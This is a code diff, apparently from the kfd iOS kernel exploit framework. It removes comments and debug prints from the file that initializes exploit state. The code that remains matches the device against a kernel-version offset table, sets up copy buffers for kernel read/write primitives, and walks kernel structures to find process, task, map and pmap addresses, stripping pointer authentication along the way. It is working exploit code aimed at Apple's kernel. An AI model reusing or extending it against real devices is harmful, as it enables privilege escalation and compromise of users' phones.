@@ -9,9 +9,6 @@
 #include "info/static_info.h"
 #import <sys/utsname.h>
 
-/*
- * Note that these macros assume that the kfd pointer is in scope.
- */
 #define kfd_offset(field_name) (kern_versions[kfd->info.env.vid].field_name)
 
 #define kget_u64(field_name, object_kaddr)                                        \
@@ -45,16 +42,7 @@
 const char info_copy_sentinel[] = "p0up0u was here";
 const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);
 
-void info_init(struct kfd* kfd)
-{
-    /*
-     * Initialize the kfd->info.copy substructure.
-     *
-     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
-     * - The size of the copy must be strictly greater than msg_ool_size_small.
-     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
-     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
-     */
+void info_init(struct kfd* kfd) {
     kfd->info.copy.size = pages(4);
     assert(kfd->info.copy.size > msg_ool_size_small);
     assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
@@ -63,31 +51,18 @@ void info_init(struct kfd* kfd)
         bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
         bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
     }
-
-    /*
-     * Initialize the kfd->info.env substructure.
-     */
     kfd->info.env.pid = getpid();
-    //print_i32(kfd->info.env.pid);
-
     thread_identifier_info_data_t data = {};
     thread_info_t info = (thread_info_t)(&data);
     mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
     assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
     kfd->info.env.tid = data.thread_id;
-    //print_u64(kfd->info.env.tid);
-
     usize size1 = sizeof(kfd->info.env.maxfilesperproc);
     assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
-    //print_u64(kfd->info.env.maxfilesperproc);
-
     struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
     assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
-
     usize size2 = sizeof(kfd->info.env.kern_version);
     assert_bsd(sysctlbyname("kern.version", &kfd->info.env.kern_version, &size2, NULL, 0));
-    //print_string(kfd->info.env.kern_version);
-
     t1sz_boot = strstr(kfd->info.env.kern_version, "T8120") != NULL ? 17ull : 25ull;
     const u64 number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
     struct utsname systemInfo;
@@ -101,49 +76,25 @@ void info_init(struct kfd* kfd)
         const char* current_build_version = kern_versions[i].build_version;
         if (strcmp(current_device_id, systemInfo.machine) == 0 && strcmp(current_kern_version, kfd->info.env.kern_version) == 0 && strcmp(current_build_version, build_version) == 0) {
             kfd->info.env.vid = i;
-            //print_u64(kfd->info.env.vid);
             return;
         }
     }
     kfd->info.env.vid = 0;
-    //print_u64(kfd->info.env.vid);
     return;
-//    assert_false("unsupported osversion");
 }
 
-void info_run(struct kfd* kfd)
-{
-    timer_start();
-
-    /*
-     * current_proc() and current_task()
-     */
+void info_run(struct kfd* kfd) {
     assert(kfd->info.kaddr.current_proc);
     kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + kfd_offset(proc__object_size);
     print_x64(kfd->info.kaddr.current_proc);
     print_x64(kfd->info.kaddr.current_task);
-
-    /*
-     * current_map()
-     */
     u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.current_task);
     kfd->info.kaddr.current_map = unsign_kaddr(signed_map_kaddr);
-    //print_x64(kfd->info.kaddr.current_map);
-
-    /*
-     * current_pmap()
-     */
     u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.current_map);
     kfd->info.kaddr.current_pmap = unsign_kaddr(signed_pmap_kaddr);
-    //print_x64(kfd->info.kaddr.current_pmap);
-
-    /*
-     * current_thread() and current_uthread()
-     */
     const bool find_current_thread = false;
     if (find_current_thread) {
         u64 thread_kaddr = kget_u64(task__threads__next, kfd->info.kaddr.current_task);
-
         while (true) {
             u64 tid = kget_u64(thread__thread_id, thread_kaddr);
             if (tid == kfd->info.env.tid) {
@@ -151,42 +102,21 @@ void info_run(struct kfd* kfd)
                 kfd->info.kaddr.current_uthread = thread_kaddr + kfd_offset(thread__object_size);
                 break;
             }
-
             thread_kaddr = kget_u64(thread__task_threads__next, thread_kaddr);
         }
-
-        //print_x64(kfd->info.kaddr.current_thread);
-        //print_x64(kfd->info.kaddr.current_uthread);
     }
-
     if (kfd->info.kaddr.kernel_proc) {
-        /*
-         * kernel_proc() and kernel_task()
-         */
         kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + kfd_offset(proc__object_size);
         print_x64(kfd->info.kaddr.kernel_proc);
         print_x64(kfd->info.kaddr.kernel_task);
-
-        /*
-         * kernel_map()
-         */
         u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.kernel_task);
         kfd->info.kaddr.kernel_map = unsign_kaddr(signed_map_kaddr);
-        //print_x64(kfd->info.kaddr.kernel_map);
-
-        /*
-         * kernel_pmap()
-         */
         u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.kernel_map);
         kfd->info.kaddr.kernel_pmap = unsign_kaddr(signed_pmap_kaddr);
-        //print_x64(kfd->info.kaddr.kernel_pmap);
     }
-
-    timer_end();
 }
 
-void info_free(struct kfd* kfd)
-{
+void info_free(struct kfd* kfd) {
     assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
     assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
 }
